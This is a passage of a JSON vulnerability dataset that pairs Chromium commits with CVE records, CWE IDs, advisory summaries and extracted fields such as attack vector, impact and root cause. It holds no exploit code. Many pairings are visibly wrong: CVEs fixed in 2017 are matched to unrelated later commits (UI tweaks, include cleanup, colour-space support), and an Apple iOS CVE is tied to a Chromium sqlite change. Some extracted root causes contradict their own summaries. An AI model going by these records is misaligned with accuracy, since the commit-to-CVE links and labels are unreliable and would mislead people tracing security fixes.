attacker"},{"commit_id":"2386a6a49ea992a1e859eb0296c1cc53e5772cdb","cve_id":"CVE-2016-1643","cwe_id":"CWE-361","commit_message":"ImageInputType::ensurePrimaryContent should recreate UA shadow tree.\n\nOnce the fallback shadow tree was created, it was never recreated even if\nensurePrimaryContent was called.  Such situation happens by updating |src|\nattribute.\n\nBUG=589838\n\nReview URL: https:\/\/codereview.chromium.org\/1732753004\n\nCr-Commit-Position: refs\/heads\/master@{#377804}","summary":"The ImageInputType::ensurePrimaryContent function in WebKit\/Source\/core\/html\/forms\/ImageInputType.cpp in Blink, as used in Google Chrome before 49.0.2623.87, does not properly maintain the user agent shadow DOM, which allows remote attackers to cause a denial of service or possibly have unspecified other impact via vectors that leverage *type confusion.*","commit_message_1":"should recreate ua shadow tree","Vulnerability Type":"code execution","Attack Vector":"via vectors that leverage * type confusion ","Impact":"cause a denial of service","Root Cause":"does not properly maintain the user agent shadow dom","Attack Type":"remote attacker"},{"commit_id":"7716418a27d561ee295a99f11fd3865580748de2","cve_id":"CVE-2016-1624","cwe_id":"CWE-119","commit_message":"Cherry pick underflow fix.\n\nBUG=583607\n\nReview URL: https:\/\/codereview.chromium.org\/1662313002\n\nCr-Commit-Position: refs\/heads\/master@{#373736}","summary":"Integer underflow in the ProcessCommandsInternal function in dec\/decode.c in Brotli, as used in Google Chrome before 48.0.2564.109, allows remote attackers to cause a denial of service (buffer overflow) or possibly have unspecified other impact via crafted data with brotli compression.","commit_message_1":"cherry pick underflow fix","Vulnerability Type":"buffer overflow","Attack Vector":"via crafted data with brotli compression","Impact":"cause a denial of service ( buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by improper bounds checking by Brotli","Attack Type":"remote attacker"},{"commit_id":"41cc463ecc5f0ba708a2c8282a7e7208ca7daa57","cve_id":"CVE-2016-1625","cwe_id":"CWE-264","commit_message":"Remove some unused includes in headless\/\n\nBug: \nChange-Id: Icb5351bb6112fc89e36dab82c15f32887dab9217\nReviewed-on: https:\/\/chromium-review.googlesource.com\/720594\nReviewed-by: David Vallet <dvallet@chromium.org>\nCommit-Queue: Iris Uy <irisu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#509313}","summary":"The Chrome Instant feature in Google Chrome before 48.0.2564.109 does not ensure that a New Tab Page (NTP) navigation target is on the most-visited or suggestions list, which allows remote attackers to bypass intended restrictions via unspecified vectors, related to instant_service.cc and search_tab_helper.cc.","commit_message_1":"remove some unused includes in headless\/","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"via unspecified vectors , related to instant _ service . cc and search _ tab _ helper . cc","Impact":"bypass intended restrictions","Root Cause":"does not ensure that a new tab page ( ntp ) navigation target is on the most - visited or suggestions list","Attack Type":"remote attacker"},{"commit_id":"f6ac1dba5e36f338a490752a2cbef3339096d9fe","cve_id":"CVE-2017-5112","cwe_id":"CWE-119","commit_message":"Reset ES3 pixel pack parameters and PIXEL_PACK_BUFFER binding in DrawingBuffer before ReadPixels() and recover them later.\n\nBUG=740603\nTEST=new conformance test\nR=kbr@chromium.org,piman@chromium.org\n\nChange-Id: I3ea54c6cc34f34e249f7c8b9f792d93c5e1958f4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/570840\nReviewed-by: Antoine Labour <piman@chromium.org>\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nCommit-Queue: Zhenyao Mo <zmo@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#486518}","summary":"Heap buffer overflow in WebGL in Google Chrome prior to 61.0.3163.79 for Windows allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.","commit_message_1":"reset es3 pixel pack parameter and pixel_pack_buffer binding in drawingbuffer before readpixels ( ) and recover them later","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code inside a sandbox","Root Cause":"caused by improper bounds checking by WebGL","Attack Type":"remote attacker"},{"commit_id":"acf2f0799f6f732dd70f45ddd252d773be7afd11","cve_id":"CVE-2017-5116","cwe_id":"CWE-704","commit_message":"Desktop Page Info\/Harmony: Show close button for internal pages.\n\nThe Harmony version of Page Info for internal Chrome pages (chrome:\/\/,\nchrome-extension:\/\/ and view-source:\/\/ pages) show a close button. Update the\ncode to match this.\n\nThis patch also adds TestBrowserDialog tests for the latter two cases described\nabove (internal extension and view source pages).\n\nSee screenshot -\nhttps:\/\/drive.google.com\/file\/d\/18RZnMiHCu-rCX9N6DLUpu4mkFWguh1xm\/view?usp=sharing\n\nBug: 535074\nChange-Id: I55e5f1aa682fd4ec85f7b65ac88f5a4f5906fe53\nReviewed-on: https:\/\/chromium-review.googlesource.com\/759624\nCommit-Queue: Patti <patricialor@chromium.org>\nReviewed-by: Trent Apted <tapted@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#516624}","summary":"Type confusion in V8 in Google Chrome prior to 61.0.3163.79 for Mac, Windows, and Linux, and 61.0.3163.81 for Android, allowed a remote attacker to execute arbitrary code inside a sandbox via a crafted HTML page.","commit_message_1":"show close button for internal page","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"via a crafted html page","Impact":"execute arbitrary code inside a sandbox","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"0ab2412a104d2f235d7b9fe19d30ef605a410832","cve_id":"CVE-2017-5118","cwe_id":"CWE-732","commit_message":"Inherit CSP when we inherit the security origin\n\nThis prevents attacks that use main window navigation to get out of the\nexisting csp constraints such as the related bug\n\nBug: 747847\nChange-Id: I1e57b50da17f65d38088205b0a3c7c49ef2ae4d8\nReviewed-on: https:\/\/chromium-review.googlesource.com\/592027\nReviewed-by: Mike West <mkwst@chromium.org>\nCommit-Queue: Andy Paicu <andypaicu@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#492333}","summary":"Blink in Google Chrome prior to 61.0.3163.79 for Mac, Windows, and Linux, and 61.0.3163.81 for Android, failed to correctly propagate CSP restrictions to javascript scheme pages, which allowed a remote attacker to bypass content security policy via a crafted HTML page.","commit_message_1":"inherit csp when we inherit the security origin","Vulnerability Type":"Incorrect Permission Assignment for Critical Resource","Attack Vector":"via a crafted html page .","Impact":"bypass security restrictions","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"d007b8b750851fe1b375c463009ea3b24e5c021d","cve_id":"CVE-2017-5091","cwe_id":"CWE-416","commit_message":"[IndexedDB] Fix Cursor UAF\n\nIf the connection is closed before we return a cursor, it dies in\nIndexedDBCallbacks::IOThreadHelper::SendSuccessCursor. It's deleted on\nthe correct thread, but we also need to makes sure to remove it from its\ntransaction.\n\nTo make things simpler, we have the cursor remove itself from its\ntransaction on destruction.\n\nR: pwnall@chromium.org\nBug: 728887\nChange-Id: I8c76e6195c2490137a05213e47c635d12f4d3dd2\nReviewed-on: https:\/\/chromium-review.googlesource.com\/526284\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nReviewed-by: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#477504}","summary":"A use after free in IndexedDB in Google Chrome prior to 60.0.3112.78 for Linux, Android, Windows, and Mac allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"fix cursor uaf if the connection is closed before we return a cursor , it dy in indexeddbcallbacks : :iothreadhelper : :sendsuccesscursor","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"66b99f3fe60dce77f079cc9c07164f6a34dbea37","cve_id":"CVE-2017-5092","cwe_id":"CWE-20","commit_message":"Validate in-process plugin instance messages.\n\nBug: 733548, 733549\nCq-Include-Trybots: master.tryserver.chromium.linux:linux_site_isolation\nChange-Id: Ie5572c7bcafa05399b09c44425ddd5ce9b9e4cba\nReviewed-on: https:\/\/chromium-review.googlesource.com\/538908\nCommit-Queue: Bill Budge <bbudge@chromium.org>\nReviewed-by: Raymes Khoury <raymes@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#480696}","summary":"Insufficient validation of untrusted input in PPAPI Plugins in Google Chrome prior to 60.0.3112.78 for Windows allowed a remote attacker to potentially perform a sandbox escape via a crafted HTML page.","commit_message_1":"validate in-process plugin instance message","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"potentially perform a sandbox escape","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"0720b02e4f303ea6b114d4ae9453e3a7ff55f8dc","cve_id":"CVE-2017-5093","cwe_id":"CWE-20","commit_message":"If JavaScript shows a dialog, cause the page to lose fullscreen.\n\nBUG=670135, 550017, 726761, 728276\n\nReview-Url: https:\/\/codereview.chromium.org\/2906133004\nCr-Commit-Position: refs\/heads\/master@{#478884}","summary":"Inappropriate implementation in modal dialog handling in Blink in Google Chrome prior to 60.0.3112.78 for Mac, Windows, Linux, and Android allowed a remote attacker to prevent a full screen warning from being displayed via a crafted HTML page.","commit_message_1":"if javascript show a dialog , cause the page to lose fullscreen","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"prevent a full screen warning from being displayed","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"41f5b55ab27da6890af96f2f8f0f6dd5bc6cc93c","cve_id":"CVE-2017-5094","cwe_id":"CWE-704","commit_message":"SkiaRenderer: Support changing color space\n\nSkiaOutputSurfaceImpl did not handle the color space changing after it\nwas created previously. The SkSurfaceCharacterization color space was\nonly set during the first time Reshape() ran when the charactization is\nreturned from the GPU thread. If the color space was changed later the\nSkSurface and SkDDL color spaces no longer matched and draw failed.\n\nBug: 1009452\nChange-Id: Ib6d2083efc7e7eb6f94782342e92a809b69d6fdc\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1841811\nReviewed-by: Peng Huang <penghuang@chromium.org>\nCommit-Queue: kylechar <kylechar@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#702946}","summary":"Type confusion in extensions JavaScript bindings in Google Chrome prior to 60.0.3112.78 for Mac, Windows, Linux, and Android allowed a remote attacker to potentially maliciously modify objects via a crafted HTML page.","commit_message_1":"support changing color space skiaoutputsurfaceimpl did not handle the color space changing after it wa created previously","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"via a crafted html page","Impact":"potentially maliciously modify objects","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"adca986a53b31b6da4cb22f8e755f6856daea89a","cve_id":"CVE-2017-5104","cwe_id":"CWE-20","commit_message":"Don't show current RenderWidgetHostView while interstitial is showing.\n\nAlso moves interstitial page tracking from RenderFrameHostManager to\nWebContents, since interstitial pages are not frame-specific. This was\nnecessary for subframes to detect if an interstitial page is showing.\n\nBUG=729105\nTEST=See comment 13 of bug for repro steps\nCQ_INCLUDE_TRYBOTS=master.tryserver.chromium.linux:linux_site_isolation\n\nReview-Url: https:\/\/codereview.chromium.org\/2938313002\nCr-Commit-Position: refs\/heads\/master@{#480117}","summary":"Inappropriate implementation in interstitials in Google Chrome prior to 60.0.3112.78 for Mac allowed a remote attacker to spoof the contents of the omnibox via a crafted HTML page.","commit_message_1":"do n't show current renderwidgethostview while interstitial is showing","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox","Root Cause":"Inappropriate implementation","Attack Type":"remote attacker"},{"commit_id":"3bfe67c9c4b45eb713326aae7a67c8f7390dae08","cve_id":"CVE-2017-6991","cwe_id":"CWE-119","commit_message":"sqlite: safely move pointer values through SQL.\n\nThis lands https:\/\/www.sqlite.org\/src\/timeline?c=d6a44b35 in\nthird_party\/sqlite\/src\/ and\nthird_party\/sqlite\/patches\/0013-Add-new-interfaces-sqlite3_bind_pointer-sqlite3_resu.patch\nand re-generates third_party\/sqlite\/amalgamation\/* using the script at\nthird_party\/sqlite\/google_generate_amalgamation.sh.\n\nThe CL also adds a layout test that verifies the patch works as intended.\n\nBUG=742407\n\nChange-Id: I2e1a457459cd2e975e6241b630e7b79c82545981\nReviewed-on: https:\/\/chromium-review.googlesource.com\/572976\nReviewed-by: Chris Mumford <cmumford@chromium.org>\nCommit-Queue: Victor Costan <pwnall@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#487275}","summary":"An issue was discovered in certain Apple products. iOS before 10.3.2 is affected. macOS before 10.12.5 is affected. The issue involves the *SQLite* component. It allows remote attackers to execute arbitrary code or cause a denial of service (memory corruption and application crash) via a crafted web site.","commit_message_1":"safely move pointer value through sql","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted web site","Impact":"execute arbitrary code or cause a denial of service ( memory corruption and application crash )","Root Cause":"caused by a memory corruption issue","Attack Type":"remote attacker"},{"commit_id":"536f72f4eeb63af895ee489c7244ccf2437cd157","cve_id":"CVE-2017-5105","cwe_id":"CWE-20","commit_message":"Disallow Arabic\/Hebrew NSMs to come after an unrelated base char.\n\nArabic NSM(non-spacing mark)s and Hebrew NSMs are allowed to mix with\nLatin with the current 'moderately restrictive script mixing policy'.\nThey're not blocked by BiDi check either because both LTR and RTL labels\ncan have an NSM.\n\nBlock them from coming after an unrelated script (e.g. Latin + Arabic\nNSM).\n\nBug: chromium:729979\nTest: components_unittests --gtest_filter=*IDNToUni*\nChange-Id: I5b93fbcf76d17121bf1baaa480ef3624424b3317\nReviewed-on: https:\/\/chromium-review.googlesource.com\/528348\nReviewed-by: Peter Kasting <pkasting@chromium.org>\nCommit-Queue: Jungshik Shin <jshin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#478205}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 60.0.3112.78 for Mac, Windows, Linux, and Android allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"disallow arabic\/hebrew nsms to come after an unrelated base char","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"c25b198675380f713a56649c857b4367601d4a3d","cve_id":"CVE-2017-5107","cwe_id":"CWE-200","commit_message":"[Lock Screen Media Controls] Tweak UI based on new mocks\n\nThis CL rearranges the different components of the CrOS lock screen\nmedia controls based on the newest mocks. This involves resizing most\nof the child views and their spacings. The artwork was also resized\nand re-positioned. Additionally, the close button was moved from the\nmain view to the header row child view.\n\nArtist and title data about the current session will eventually be\nplaced to the right of the artwork, but right now this space is empty.\n\nSee the bug for before and after pictures.\n\nBug: 991647\nChange-Id: I7b97f31982ccf2912bd2564d5241bfd849d21d92\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1746554\nReviewed-by: Xiyuan Xia <xiyuan@chromium.org>\nReviewed-by: Becca Hughes <beccahughes@chromium.org>\nCommit-Queue: Mia Bergeron <miaber@google.com>\nCr-Commit-Position: refs\/heads\/master@{#686253}","summary":"A timing attack in SVG rendering in Google Chrome prior to 60.0.3112.78 for Linux, Windows, and Mac allowed a remote attacker to extract pixel values from a cross-origin page being iframe'd via a crafted HTML page.","commit_message_1":"tweak ui based on new mock this cl rearranges the different component of the cro lock screen medium control based on the newest mock","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"extract pixel values from a cross - origin page being iframe ' d","Root Cause":"caused by a user information leak","Attack Type":"remote attacker"},{"commit_id":"5cb799a393ba9e732f89f687ff3a322b4514ebfb","cve_id":"CVE-2017-5108","cwe_id":"CWE-704","commit_message":"autofocus: Fix a crash with an autofocus element in a document without browsing context.\n\nShouldAutofocus() should check existence of the browsing context.\nOtherwise, doc.TopFrameOrigin() returns null.\n\nBefore crrev.com\/695830, ShouldAutofocus() was called only for\nrendered elements. That is to say, the document always had\nbrowsing context.\n\nBug: 1003228\nChange-Id: I2a941c34e9707d44869a6d7585dc7fb9f06e3bf4\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1800902\nCommit-Queue: Kent Tamura <tkent@chromium.org>\nReviewed-by: Keishi Hattori <keishi@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#696291}","summary":"Type confusion in PDFium in Google Chrome prior to 60.0.3112.78 for Mac, Windows, Linux, and Android allowed a remote attacker to potentially maliciously modify objects via a crafted PDF file.","commit_message_1":"fix a crash with an autofocus element in a document without browsing context","Vulnerability Type":"Incorrect Type Conversion or Cast","Attack Vector":"via a crafted pdf file","Impact":"potentially maliciously modify objects","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"11601c08e92732d2883af2057c41c17cba890844","cve_id":"CVE-2017-5087","cwe_id":"CWE-416","commit_message":"[IndexedDB] Fixed transaction use-after-free vuln\n\nBug: 725032\nChange-Id: I689ded6c74d5563403587b149c3f3e02e807e4aa\nReviewed-on: https:\/\/chromium-review.googlesource.com\/518483\nReviewed-by: Joshua Bell <jsbell@chromium.org>\nCommit-Queue: Daniel Murphy <dmurph@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#475952}","summary":"A use after free in Blink in Google Chrome prior to 59.0.3071.104 for Mac, Windows, and Linux, and 59.0.3071.117 for Android, allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page, aka an IndexedDB sandbox escape.","commit_message_1":"fixed transaction use-after-free vuln","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page , aka an indexeddb sandbox escape","Impact":"perform an out of bounds memory read","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"507241119f279c31766bd41c33d6ffb6851e2d7e","cve_id":"CVE-2017-5089","cwe_id":"CWE-20","commit_message":"Migrate download_protection code to new DM token class.\n\nMigrates RetrieveDMToken calls to use the new BrowserDMToken class.\n\nBug: 1020296\nChange-Id: Icef580e243430d73b6c1c42b273a8540277481d9\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1904234\nCommit-Queue: Dominique Fauteux-Chapleau <domfc@chromium.org>\nReviewed-by: Tien Mai <tienmai@chromium.org>\nReviewed-by: Daniel Rubery <drubery@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#714196}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 59.0.3071.104 for Mac allowed a remote attacker to perform domain spoofing via a crafted domain name.","commit_message_1":"migrate download_protection code to new dm token class","Vulnerability Type":"Improper Input Validation","Attack Vector":"via a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"fea16c8b60ff3d0756d5eb392394963b647bc41a","cve_id":"CVE-2017-5075","cwe_id":"CWE-200","commit_message":"CSP: Strip the fragment from reported URLs.\n\nWe should have been stripping the fragment from the URL we report for\nCSP violations, but we weren't. Now we are, by running the URLs through\n`stripURLForUseInReport()`, which implements the stripping algorithm\nfrom CSP2: https:\/\/www.w3.org\/TR\/CSP2\/#strip-uri-for-reporting\n\nEventually, we will migrate more completely to the CSP3 world that\ndoesn't require such detailed stripping, as it exposes less data to the\nreports, but we're not there yet.\n\nBUG=678776\n\nReview-Url: https:\/\/codereview.chromium.org\/2619783002\nCr-Commit-Position: refs\/heads\/master@{#458045}","summary":"Inappropriate implementation in CSP reporting in Blink in Google Chrome prior to 59.0.3071.86 for Linux, Windows, and Mac, and 59.0.3071.92 for Android, allowed a remote attacker to obtain the value of url fragments via a crafted HTML page.","commit_message_1":"strip the fragment from reported url","Vulnerability Type":"Exposure of Sensitive Information to an Unauthorized Actor","Attack Vector":"via a crafted html page","Impact":"obtain the value of url fragments","Root Cause":"caused by a leak","Attack Type":"remote attacker"},{"commit_id":"ae6f339fba0736224fdca0b96d2bb1cda42d8ad3","cve_id":"CVE-2017-5086","cwe_id":"CWE-20","commit_message":"Block Tifinagh + Latin mix\n\nBUG=chromium:722639\nTEST=components_unittests --gtest_filter=*IDNToU*\n\nReview-Url: https:\/\/codereview.chromium.org\/2894313002\nCr-Commit-Position: refs\/heads\/master@{#474199}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 59.0.3071.86 for Windows and Mac allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"block tifinagh + latin mix","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"e7b0b560a8f1c3f1c15a2c7486d212543660b8a6","cve_id":"CVE-2017-5076","cwe_id":"CWE-20","commit_message":"Fix error handling in the request sender and url fetcher downloader.\n\nThat means handling the network errors by primarily looking at net_error.\n\nBug: 1028369\nChange-Id: I8181bced25f8b56144ea336a03883d0dceea5108\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1935428\nReviewed-by: Joshua Pawlicki <waffles@chromium.org>\nCommit-Queue: Sorin Jianu <sorin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#719199}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 59.0.3071.86 for Mac, Windows, and Linux, and 59.0.3071.92 for Android, allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"fix error handling in the request sender and url fetcher downloader","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"fec26ff33bf372476a70326f3669a35f34a9d474","cve_id":"CVE-2017-5077","cwe_id":"CWE-125","commit_message":"Origins should be represented as url::Origin (not as GURL).\n\nAs pointed out in \/\/docs\/security\/origin-vs-url.md, origins should be\nrepresented as url::Origin (not as GURL).  This CL applies this\nguideline to predictor-related code and changes the type of the\nfollowing fields from GURL to url::Origin:\n- OriginRequestSummary::origin\n- PreconnectedRequestStats::origin\n- PreconnectRequest::origin\n\nThe old code did not depend on any non-origin parts of GURL\n(like path and\/or query).  Therefore, this CL has no intended\nbehavior change.\n\nBug: 973885\nChange-Id: Idd14590b4834cb9d50c74ed747b595fe1a4ba357\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1895167\nCommit-Queue: \u0141ukasz Anforowicz <lukasza@chromium.org>\nReviewed-by: Alex Ilin <alexilin@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#716311}","summary":"Insufficient validation of untrusted input in Skia in Google Chrome prior to 59.0.3071.86 for Linux, Windows, and Mac, and 59.0.3071.92 for Android, allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"origin should be represented a url : :origin ( not a gurl )","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by improper bounds checking by Skia","Attack Type":"remote attacker"},{"commit_id":"a0ae9ed7bc545314dfcd4882db3498fda1808b4f","cve_id":"CVE-2017-5078","cwe_id":null,"commit_message":"Consider scroll-padding when determining scroll anchor node\n\nScroll anchoring should not anchor to a node that is behind scroll\npadding.\n\nBug: 1010002\nChange-Id: Icbd89fb85ea2c97a6de635930a9896f6a87b8f07\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1887745\nReviewed-by: Chris Harrelson <chrishtr@chromium.org>\nCommit-Queue: Nick Burris <nburris@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#711020}","summary":"Insufficient validation of untrusted input in Blink's mailto: handling in Google Chrome prior to 59.0.3071.86 for Linux, Windows, and Mac allowed a remote attacker to perform command injection via a crafted HTML page, a similar issue to CVE-2004-0121. For example, characters such as * have an incorrect interaction with xdg-email in xdg-utils, and a space character can be used in front of a command-line argument.","commit_message_1":"consider scroll-padding when determining scroll anchor node scroll anchoring should not anchor to a node that is behind scroll padding","Vulnerability Type":"unspecified","Attack Vector":"via a crafted html page , a similar issue to cve - 2004 - 0121","Impact":"perform command injection","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"8b457840e3512ef8c2af8d966a3edce5c653a835","cve_id":"CVE-2017-5080","cwe_id":"CWE-416","commit_message":"[autofill] Avoid duplicate instances of the SaveCardBubble.\n\nautofill::SaveCardBubbleControllerImpl::ShowBubble() expects\n(via DCHECK) to only be called when the save card bubble is\nnot already visible. This constraint is violated if the user\nclicks multiple times on a submit button.\n\nIf the underlying page goes away, the last SaveCardBubbleView\ncreated by the controller will be automatically cleaned up,\nbut any others are left visible on the screen... holding a\nrefence to a possibly-deleted controller.\n\nThis CL early exits the ShowBubbleFor*** and ReshowBubble logic\nif the bubble is already visible.\n\nBUG=708819\n\nReview-Url: https:\/\/codereview.chromium.org\/2862933002\nCr-Commit-Position: refs\/heads\/master@{#469768}","summary":"A use after free in credit card autofill in Google Chrome prior to 59.0.3071.86 for Linux and Windows allowed a remote attacker to perform an out of bounds memory read via a crafted HTML page.","commit_message_1":"avoid duplicate instance of the savecardbubble","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted html page","Impact":"perform an out of bounds memory read","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"cbc5d5153b18ea387f4769caa01d1339261f6ed6","cve_id":"CVE-2017-5057","cwe_id":"CWE-125","commit_message":"gpu: Disallow use of IOSurfaces for half-float format with swiftshader.\n\nR=kbr@chromium.org\n\nBug: 998038\nChange-Id: Ic31d28938ef205b36657fc7bd297fe8a63d08543\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1798052\nCommit-Queue: Kenneth Russell <kbr@chromium.org>\nReviewed-by: Kenneth Russell <kbr@chromium.org>\nAuto-Submit: Khushal <khushalsagar@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#695826}","summary":"Type confusion in PDFium in Google Chrome prior to 58.0.3029.81 for Mac, Windows, and Linux, and 58.0.3029.83 for Android, allowed a remote attacker to perform an out of bounds memory read via a crafted PDF file.","commit_message_1":"disallow use of iosurfaces for half-float format with swiftshader","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted pdf file","Impact":"perform an out of bounds memory read","Root Cause":"caused by a type confusion","Attack Type":"remote attacker"},{"commit_id":"08cb718ba7c3961c1006176c9faba0a5841ec792","cve_id":"CVE-2017-5060","cwe_id":"CWE-20","commit_message":"Block domain labels made of Cyrillic letters that look alike Latin\n\nBlock a label made entirely of Latin-look-alike Cyrillic letters when the TLD is not an IDN (i.e. this check is ON only for TLDs like 'com', 'net', 'uk', but not applied for IDN TLDs like \u0440\u0444.\n\nBUG=683314\nTEST=components_unittests --gtest_filter=U*IDN*\n\nReview-Url: https:\/\/codereview.chromium.org\/2683793010\nCr-Commit-Position: refs\/heads\/master@{#459226}","summary":"Insufficient Policy Enforcement in Omnibox in Google Chrome prior to 58.0.3029.81 for Mac, Windows, and Linux, and 58.0.3029.83 for Android, allowed a remote attacker to perform domain spoofing via IDN homographs in a crafted domain name.","commit_message_1":"block domain label made of cyrillic letter that look alike latin block a label made entirely of latin-look-alike cyrillic letter when the tld is not an idn ( <file>","Vulnerability Type":"Improper Input Validation","Attack Vector":"via idn homographs in a crafted domain name","Impact":"perform domain spoofing","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"5d78b84d39bd34bc9fce9d01c0dcd5a22a330d34","cve_id":"CVE-2017-5061","cwe_id":"CWE-362","commit_message":"(Reland) Discard compositor frames from unloaded web content\n\nThis is a reland of https:\/\/codereview.chromium.org\/2707243005\/ with a\nsmall change to fix an uninitialized memory error that fails on MSAN\nbots.\n\nBUG=672847\nTBR=danakj@chromium.org, creis@chromium.org\nCQ_INCLUDE_TRYBOTS=master.tryserver.blink:linux_trusty_blink_rel;master.tryserver.chromium.linux:linux_site_isolation\n\nReview-Url: https:\/\/codereview.chromium.org\/2731283003\nCr-Commit-Position: refs\/heads\/master@{#454954}","summary":"A race condition in navigation in Google Chrome prior to 58.0.3029.81 for Linux, Windows, and Mac allowed a remote attacker to spoof the contents of the Omnibox (URL bar) via a crafted HTML page.","commit_message_1":"( reland ) discard compositor frame from unloaded web content this is a reland of http : \/\/<file>","Vulnerability Type":"Race Condition","Attack Vector":"via a crafted html page","Impact":"spoof the contents of the omnibox ( url bar )","Root Cause":"caused by an error","Attack Type":"remote attacker"},{"commit_id":"7a0dee9d17d0ee7fd1b40b017442f4952384a7c2","cve_id":"CVE-2017-5069","cwe_id":"CWE-79","commit_message":"Prevent regular mode session startup pref type turning to default.\n\nWhen user loses past session tabs of regular mode after\ninvoking a new window from the incognito mode.\n\nThis was happening because the SessionStartUpPref type was being set\nto default, from last, for regular user mode. This was happening in\nthe RestoreIfNecessary method where the restoration was taking place\nfor users whose SessionStartUpPref type was set to last.\n\nThe fix was to make the protocol of changing the pref type to\ndefault more explicit to incognito users and not regular users\nof pref type last.\n\nBug: 481373\nChange-Id: I96efb4cf196949312181c83c6dcd45986ddded13\nReviewed-on: https:\/\/chromium-review.googlesource.com\/c\/chromium\/src\/+\/1774441\nReviewed-by: Tommy Martino <tmartino@chromium.org>\nReviewed-by: Ramin Halavati <rhalavati@chromium.org>\nCommit-Queue: Rohit Agarwal <roagarwal@chromium.org>\nCr-Commit-Position: refs\/heads\/master@{#691726}","summary":"Incorrect MIME type of XSS-Protection reports in Blink in Google Chrome prior to 58.0.3029.81 for Linux, Windows, and Mac, and 58.0.3029.83 for Android, allowed a remote attacker to circumvent Cross-Origin Resource Sharing checks via a crafted HTML page.","commit_message_1":"prevent regular mode session startup pref type turning to default","Vulnerability Type":"Cross-site Scripting","Attack Vector":"via a crafted html page","Impact":"circumvent cross - origin resource sharing checks","Root Cause":"caused by incorrect MIME type of XSS-Protection reports","Attack Type":"remote attacker"},{"commit_id":"13e1002277287ed0090b2ca76c2d01545e677935","cve_id":"CVE-2017-5068","cwe_id":"CWE-362","commit_message":"Fix the crash after clamshell -> tablet transition in overview 